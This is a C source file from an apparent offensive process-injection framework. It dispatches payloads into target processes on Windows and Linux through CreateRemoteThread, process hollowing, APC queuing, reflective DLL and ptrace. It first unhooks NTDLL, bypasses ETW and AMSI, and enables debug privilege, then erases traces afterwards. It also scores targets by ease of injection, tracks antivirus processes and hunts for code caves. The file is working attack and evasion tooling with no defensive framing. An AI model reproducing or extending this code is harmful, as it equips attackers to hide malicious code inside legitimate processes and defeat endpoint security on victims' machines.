/*
 * Process Injection Core Implementation
 * Platform-independent injection logic
 */

#include "inject_core.h"
#include "../core/utils.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

// Global state
static bool g_initialized = false;
static inject_config_t* g_current_config = NULL;

// Status strings
static const char* g_status_strings[] = {
    "Success",
    "Generic error",
    "Process not found",
    "Access denied",
    "Allocation failed",
    "Write failed",
    "Execution failed",
    "Technique unsupported",
    "Architecture mismatch",
    "Invalid parameters",
    "Timeout"
};

// Technique strings
static const char* g_technique_strings[] = {
    "CreateRemoteThread",
    "SetWindowsHook",
    "QueueUserAPC",
    "SetThreadContext",
    "Process Hollowing",
    "Manual Mapping",
    "Reflective DLL",
    "Atom Bombing",
    "Thread Hijacking",
    "ptrace",
    "LD_PRELOAD",
    "/proc/mem",
    "dlopen",
    "VDSO Hijack",
    ".so Injection",
    "Auto-select"
};

// Initialize injection framework
inject_status_t inject_init(void) {
    if (g_initialized) {
        return INJECT_SUCCESS;
    }
    
#ifdef PLATFORM_WINDOWS
    // Setup direct syscalls
    inject_status_t status = inject_setup_syscalls();
    if (status != INJECT_SUCCESS) {
        return status;
    }
    
    // Enable debug privilege
    status = inject_enable_debug_privilege();
    if (status != INJECT_SUCCESS) {
        // Not critical, continue
    }
#endif
    
    g_initialized = true;
    return INJECT_SUCCESS;
}

// Cleanup injection framework
inject_status_t inject_cleanup(void) {
    if (!g_initialized) {
        return INJECT_SUCCESS;
    }
    
    g_current_config = NULL;
    g_initialized = false;
    
    return INJECT_SUCCESS;
}

// Main injection function - routes to appropriate technique
inject_status_t inject_execute(inject_config_t* config) {
    if (!config || !config->payload || config->payload_size == 0) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    // Initialize if needed
    if (!g_initialized) {
        inject_status_t status = inject_init();
        if (status != INJECT_SUCCESS) {
            return status;
        }
    }
    
    g_current_config = config;
    
    // Call progress callback
    if (config->on_progress) {
        config->on_progress("Starting injection...");
    }
    
    // Get process info
    inject_process_info_t proc_info = {0};
    inject_status_t status = inject_get_process_info(config->target_pid, &proc_info);
    if (status != INJECT_SUCCESS) {
        if (config->on_error) {
            config->on_error("Failed to get process information");
        }
        return status;
    }
    
    // Check if process is injectable
    if (!inject_is_process_injectable(&proc_info)) {
        if (config->on_error) {
            config->on_error("Process is not injectable (protected/critical)");
        }
        return INJECT_ERROR_ACCESS_DENIED;
    }
    
    // Auto-select technique if requested
    if (config->technique == INJECT_TECHNIQUE_AUTO) {
        config->technique = inject_select_best_technique(&proc_info);
        if (config->on_progress) {
            char msg[256];
            snprintf(msg, sizeof(msg), "Auto-selected technique: %s", 
                    inject_technique_to_string(config->technique));
            config->on_progress(msg);
        }
    }
    
    // Apply evasion techniques if requested
    if (config->flags & INJECT_FLAG_UNHOOK_NTDLL) {
        if (config->on_progress) {
            config->on_progress("Unhooking NTDLL...");
        }
        inject_unhook_ntdll();
    }
    
    if (config->flags & INJECT_FLAG_BYPASS_ETW) {
        if (config->on_progress) {
            config->on_progress("Bypassing ETW...");
        }
        inject_bypass_etw();
    }
    
    if (config->flags & INJECT_FLAG_BYPASS_AMSI) {
        if (config->on_progress) {
            config->on_progress("Bypassing AMSI...");
        }
        inject_bypass_amsi();
    }
    
    // Execute injection based on technique
    switch (config->technique) {
#ifdef PLATFORM_WINDOWS
        case INJECT_TECHNIQUE_CREATE_REMOTE_THREAD:
            status = inject_create_remote_thread(config);
            break;
            
        case INJECT_TECHNIQUE_PROCESS_HOLLOWING:
            status = inject_process_hollowing(config);
            break;
            
        case INJECT_TECHNIQUE_QUEUE_USER_APC:
            status = inject_queue_user_apc(config);
            break;
            
        case INJECT_TECHNIQUE_MANUAL_MAP:
            status = inject_manual_map(config);
            break;
            
        case INJECT_TECHNIQUE_REFLECTIVE_DLL:
            status = inject_reflective_dll(config);
            break;
            
        case INJECT_TECHNIQUE_SET_WINDOWS_HOOK:
            status = inject_set_windows_hook(config);
            break;
#endif

#ifdef PLATFORM_LINUX
        case INJECT_TECHNIQUE_PTRACE:
            status = inject_ptrace(config);
            break;
            
        case INJECT_TECHNIQUE_PROC_MEM:
            status = inject_proc_mem(config);
            break;
            
        case INJECT_TECHNIQUE_LD_PRELOAD:
            status = inject_ld_preload(config);
            break;
#endif
        
        default:
            status = INJECT_ERROR_TECHNIQUE_UNSUPPORTED;
            break;
    }
    
    // Cleanup if requested
    if (status == INJECT_SUCCESS && (config->flags & INJECT_FLAG_CLEANUP)) {
        if (config->on_progress) {
            config->on_progress("Cleaning up traces...");
        }
        inject_remove_traces(config->target_pid);
    }
    
    // Call appropriate callback
    if (status == INJECT_SUCCESS) {
        if (config->on_success) {
            config->on_success();
        }
    } else {
        if (config->on_error) {
            char msg[256];
            snprintf(msg, sizeof(msg), "Injection failed: %s", 
                    inject_status_to_string(status));
            config->on_error(msg);
        }
    }
    
    g_current_config = NULL;
    return status;
}

// Check if process is injectable
bool inject_is_process_injectable(inject_process_info_t* info) {
    if (!info) {
        return false;
    }
    
    // Don't inject into critical system processes
    const char* critical_processes[] = {
        "System", "smss.exe", "csrss.exe", "wininit.exe",
        "services.exe", "lsass.exe", "winlogon.exe",
        "init", "systemd", "kernel"
    };
    
    for (int i = 0; i < sizeof(critical_processes) / sizeof(critical_processes[0]); i++) {
        if (strstr(info->name, critical_processes[i]) != NULL) {
            return false;
        }
    }
    
    // Check if it's a security product
    const char* security_products[] = {
        "MsMpEng.exe", "avp.exe", "avgnt.exe", "ashServ.exe",
        "avguard.exe", "bdagent.exe", "vsserv.exe", "mcshield.exe"
    };
    
    for (int i = 0; i < sizeof(security_products) / sizeof(security_products[0]); i++) {
        if (strstr(info->name, security_products[i]) != NULL) {
            // Still injectable but risky
            return true;
        }
    }
    
    return true;
}

// Select best injection technique for process
inject_technique_t inject_select_best_technique(inject_process_info_t* info) {
    if (!info) {
        return INJECT_TECHNIQUE_CREATE_REMOTE_THREAD;
    }
    
#ifdef PLATFORM_WINDOWS
    // For suspended processes, use APC
    if (info->is_suspended) {
        return INJECT_TECHNIQUE_QUEUE_USER_APC;
    }
    
    // For system processes, use more stealthy techniques
    if (info->is_system) {
        return INJECT_TECHNIQUE_MANUAL_MAP;
    }
    
    // For protected processes, use process hollowing
    if (info->is_protected) {
        return INJECT_TECHNIQUE_PROCESS_HOLLOWING;
    }
    
    // Default to CreateRemoteThread
    return INJECT_TECHNIQUE_CREATE_REMOTE_THREAD;
    
#elif defined(PLATFORM_LINUX)
    // For system processes, use proc/mem
    if (info->is_system) {
        return INJECT_TECHNIQUE_PROC_MEM;
    }
    
    // Default to ptrace
    return INJECT_TECHNIQUE_PTRACE;
#else
    return INJECT_TECHNIQUE_AUTO;
#endif
}

// Analyze process for injection viability (0-100 score)
inject_status_t inject_analyze_process(uint32_t pid, int* injection_score) {
    if (!injection_score) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    inject_process_info_t info = {0};
    inject_status_t status = inject_get_process_info(pid, &info);
    if (status != INJECT_SUCCESS) {
        return status;
    }
    
    int score = 100;
    
    // Reduce score for risky targets
    if (info.is_system) {
        score -= 30;
    }
    
    if (info.is_protected) {
        score -= 20;
    }
    
    if (strstr(info.name, "MsMpEng") || strstr(info.name, "antivirus")) {
        score -= 40;
    }
    
    // High thread count means complex process
    if (info.thread_count > 50) {
        score -= 10;
    }
    
    // High handle count means lots of resources
    if (info.handle_count > 1000) {
        score -= 10;
    }
    
    // Increase score for good targets
    if (strstr(info.name, "notepad") || strstr(info.name, "calc")) {
        score += 20;
    }
    
    if (strstr(info.name, "explorer") || strstr(info.name, "chrome")) {
        score += 10;
    }
    
    // Clamp to 0-100
    if (score < 0) score = 0;
    if (score > 100) score = 100;
    
    *injection_score = score;
    return INJECT_SUCCESS;
}

// Find code cave in target process
inject_status_t inject_find_code_cave(uint32_t pid, size_t size, uint64_t* address) {
    if (!address || size == 0) {
        return INJECT_ERROR_INVALID_PARAMS;
    }
    
    memory_region_t* regions = NULL;
    uint32_t region_count = 0;
    
    inject_status_t status = inject_enum_memory_regions(pid, &regions, &region_count);
    if (status != INJECT_SUCCESS) {
        return status;
    }
    
    // Look for executable regions with enough space
    for (uint32_t i = 0; i < region_count; i++) {
        if (!regions[i].is_executable) {
            continue;
        }
        
        // Read the region to find null bytes
        uint8_t* buffer = (uint8_t*)malloc(regions[i].region_size);
        if (!buffer) {
            continue;
        }
        
        status = inject_read_memory(pid, regions[i].base_address, 
                                   buffer, regions[i].region_size);
        
        if (status == INJECT_SUCCESS) {
            // Look for consecutive null bytes
            size_t null_count = 0;
            for (size_t j = 0; j < regions[i].region_size; j++) {
                if (buffer[j] == 0x00 || buffer[j] == 0x90) {  // NOP or NULL
                    null_count++;
                    if (null_count >= size) {
                        *address = regions[i].base_address + j - size + 1;
                        free(buffer);
                        free(regions);
                        return INJECT_SUCCESS;
                    }
                } else {
                    null_count = 0;
                }
            }
        }
        
        free(buffer);
    }
    
    free(regions);
    return INJECT_ERROR_ALLOCATION_FAILED;
}

// Convert status to string
const char* inject_status_to_string(inject_status_t status) {
    int index = -status;
    if (index >= 0 && index < sizeof(g_status_strings) / sizeof(g_status_strings[0])) {
        return g_status_strings[index];
    }
    return "Unknown status";
}

// Convert technique to string
const char* inject_technique_to_string(inject_technique_t technique) {
    // Map technique enum to array index
    switch (technique) {
        case INJECT_TECHNIQUE_CREATE_REMOTE_THREAD: return "CreateRemoteThread";
        case INJECT_TECHNIQUE_SET_WINDOWS_HOOK: return "SetWindowsHook";
        case INJECT_TECHNIQUE_QUEUE_USER_APC: return "QueueUserAPC";
        case INJECT_TECHNIQUE_SET_THREAD_CONTEXT: return "SetThreadContext";
        case INJECT_TECHNIQUE_PROCESS_HOLLOWING: return "Process Hollowing";
        case INJECT_TECHNIQUE_MANUAL_MAP: return "Manual Mapping";
        case INJECT_TECHNIQUE_REFLECTIVE_DLL: return "Reflective DLL";
        case INJECT_TECHNIQUE_ATOM_BOMBING: return "Atom Bombing";
        case INJECT_TECHNIQUE_THREAD_HIJACKING: return "Thread Hijacking";
        case INJECT_TECHNIQUE_PTRACE: return "ptrace";
        case INJECT_TECHNIQUE_LD_PRELOAD: return "LD_PRELOAD";
        case INJECT_TECHNIQUE_PROC_MEM: return "/proc/mem";
        case INJECT_TECHNIQUE_DLOPEN: return "dlopen";
        case INJECT_TECHNIQUE_VDSO_HIJACK: return "VDSO Hijack";
        case INJECT_TECHNIQUE_SO_INJECTION: return ".so Injection";
        case INJECT_TECHNIQUE_AUTO: return "Auto-select";
        default: return "Unknown";
    }
}